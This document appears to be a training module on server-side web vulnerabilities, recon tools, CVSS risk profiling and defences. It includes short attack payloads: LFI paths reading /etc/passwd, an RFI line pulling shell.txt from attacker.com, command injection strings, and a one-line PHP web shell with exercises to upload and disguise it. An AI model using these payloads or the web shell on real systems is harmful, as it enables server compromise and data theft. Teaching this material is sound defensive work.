# 🛡️ Module 3: Server-Side Vulnerabilities and Risk Profiling (Extended Version)

This module focuses on server-side vulnerabilities and how attackers target the backend of web applications. It covers common misconfigurations, dangerous programming practices, and flawed server logic. Additionally, it introduces a structured approach to **risk profiling** — understanding which issues are most critical in a real-world assessment.

---

## 🎯 Learning Objectives

By the end of this module, students will be able to:

- Describe the difference between client-side and server-side vulnerabilities
- Identify and exploit common server-side flaws such as LFI, RFI, command injection, and insecure file uploads
- Understand how deserialization flaws lead to remote code execution
- Use tools to enumerate directories, test for misconfigurations, and fingerprint servers
- Conduct risk profiling using factors like severity, exploitability, and business impact

---

## 🖥️ Server-Side vs. Client-Side Security

### 👁️ Client-Side
- Runs in the user's browser (e.g., JavaScript)
- Vulnerabilities affect the **user's** environment

### 🧠 Server-Side
- Runs on the server (PHP, Python, Java, Node.js)
- Vulnerabilities impact the **application** and **its data**
- Exploits can lead to **full server compromise**

---

## 💥 Common Server-Side Vulnerabilities

### 1. **Local File Inclusion (LFI)**
- Occurs when a file path from user input is used directly by the server.
- Attackers can read arbitrary files:
  ```
  ?page=../../../../etc/passwd
  ```

### 2. **Remote File Inclusion (RFI)**
- Similar to LFI, but allows remote resources:
  ```
  ?page=http://attacker.com/shell.txt
  ```

### 3. **Command Injection**
- User-supplied input is passed directly to the OS shell:
  ```
  ping 10.0.0.1; cat /etc/passwd
  ```

- Dangerous because it allows arbitrary OS command execution.

### 4. **Insecure File Uploads**
- Uploading `.php`, `.jsp`, or `.exe` files and executing them
- Attackers may:
  - Bypass MIME/type checking
  - Upload disguised files (`shell.php.jpg`)
  - Use misconfigured directories with execute permissions

### 5. **Deserialization Attacks**
- Applications deserialize data without validation
- If attacker can craft objects in serialized format (PHP, Java, .NET), arbitrary code may run upon deserialization

---

## 🔍 Practical Exploitation

### 🛠️ Tools
- Burp Suite (manual request crafting)
- `curl` and `wget` for file uploads and command injection testing
- `ffuf`/`dirbuster` for content discovery
- `whatweb`, `wappalyzer` for tech fingerprinting

---

## 🗂️ Directory and Resource Enumeration

Many vulnerabilities are discovered by brute-forcing hidden directories:

```bash
ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Try these for:
- `/admin/`, `/backup/`, `/test/`
- `.git/`, `.env`, `config.php`, `db.sqlite`

---

## 🛠️ Server Fingerprinting

Tools like `whatweb`, `httprint`, or `nmap` can identify:
- Server software and version (Apache, nginx, IIS)
- Programming language (PHP, Python)
- CMS or frameworks (WordPress, Laravel, etc.)

Example:
```bash
whatweb https://target.com
```

---

## 📊 Risk Profiling and Prioritization

Not all vulnerabilities are equal. A risk profiling framework helps prioritize.

### 🧮 CVSS: Common Vulnerability Scoring System
- Score based on:
  - Attack Vector
  - Privileges Required
  - Impact on Confidentiality/Integrity/Availability
  - Exploit Complexity
- Result is a number between 0.0 (no risk) and 10.0 (critical)

### 📘 OWASP Top 10 and CWE
- Use OWASP Top 10 to classify:
  - A1: Broken Access Control
  - A5: Security Misconfiguration
  - A8: Software and Data Integrity Failures

---

## 📌 Case Study: File Upload Exploitation

### Scenario:
1. Web app accepts image uploads
2. No validation of file type on the server
3. Attacker uploads `shell.php`:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
4. Attacker visits:
   ```
   https://example.com/uploads/shell.php?cmd=whoami
   ```

---

## 🛡️ Defense Strategies

- Validate and sanitize **all** user input on the server
- Use **whitelists** for acceptable file types
- Store uploads outside of the web root
- Disable dangerous PHP functions (`exec`, `system`)
- Serialize objects only with safe, signed formats (e.g., JWT)
- Use Web Application Firewalls (WAFs) as a defense-in-depth

---

## 🧪 Exercises

1. **Test for LFI**
   - Inject `?file=../../etc/passwd`
   - Monitor response for Unix file patterns

2. **Command Injection**
   - Try: `; whoami`, `&& id`, `| netstat -an`

3. **File Upload**
   - Upload `.php` shell
   - Try bypasses: double extensions (`file.php.jpg`), MIME tricks

4. **Dir Enumeration**
   - Use `ffuf` to locate sensitive files/directories

5. **Risk Profiling**
   - Score each discovered vulnerability
   - Sort findings by severity and likelihood of exploit

---

## 📚 Summary

- Server-side flaws impact core application functionality and data security
- Exploits include file inclusion, command injection, and file upload vulnerabilities
- Risk profiling is essential to prioritize what should be fixed first
- Use tools like `ffuf`, Burp, and `whatweb` for reconnaissance and exploitation
- Strong input validation, least privilege, and isolation help protect backend systems

Next module: **SQL Injection and Cross-Site Request Forgery**